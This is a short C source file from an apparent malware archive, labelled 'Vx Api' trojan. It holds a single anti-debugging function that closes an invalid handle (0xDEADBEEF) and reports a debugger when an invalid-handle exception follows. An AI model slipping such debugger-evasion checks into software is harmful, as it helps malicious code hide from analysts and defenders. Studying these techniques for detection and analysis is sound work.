/*
  name      Vx Api
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#include "Win32Helper.h"

BOOL AdfCloseHandleOnInvalidAddress(VOID)
{
	__try
	{
#pragma warning( push )
#pragma warning( disable : 4312)
		CloseHandle((HANDLE)0xDEADBEEF);
#pragma warning( pop ) 
		return FALSE;
	}
	__except (EXCEPTION_INVALID_HANDLE == GetExceptionCode() ? EXCEPTION_EXECUTE_HANDLER : EXCEPTION_CONTINUE_SEARCH)
	{
		return TRUE;
	}

	return FALSE;
}